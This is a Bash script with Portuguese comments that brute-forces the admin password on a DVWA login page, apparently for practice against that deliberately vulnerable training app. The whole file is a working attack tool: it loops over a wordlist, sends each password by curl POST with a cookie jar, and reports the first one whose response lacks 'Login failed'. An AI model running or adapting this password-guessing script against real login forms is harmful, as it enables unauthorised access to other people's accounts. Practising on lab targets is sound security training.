#!/bin/bash
# Uso: ./dvwa_bruteforce.sh <target> <wordlist>
# Ex: ./dvwa_bruteforce.sh 192.168.56.101 wordlist.txt

if [ "$#" -ne 2 ]; then
	echo "Uso: $0 <target_ip> <wordlist>"
	exit 1
fi

TARGET="$1"
WORDLIST="$2"

if [ ! -f "$WORDLIST" ]; then
	echo "Wordlist não encontrada: $WORDLIST"
	exit 1
fi

LOGIN_URL="http://$TARGET/dvwa/vulnerabilities/brute/"

while read -r pass; do
	# Envia requisição POST ao formulário
	resp=$(curl -s -L -c /tmp/cookie.txt -b /tmp/cookie.txt -X POST \
		-d "username=admin&password=$pass&Login=Login" "$LOGIN_URL")

	# Verifica se o login foi bem-sucedido (mensagem depende da instalação DVWA)
	if ! echo "$resp" | grep -q "Login failed"; then
		echo "Senha encontrada: $pass"
		rm -f /tmp/cookie.txt
		exit 0
	fi
done < "$WORDLIST"

rm -f /tmp/cookie.txt
echo "Nenhuma senha encontrada com a wordlist fornecida."
exit 2
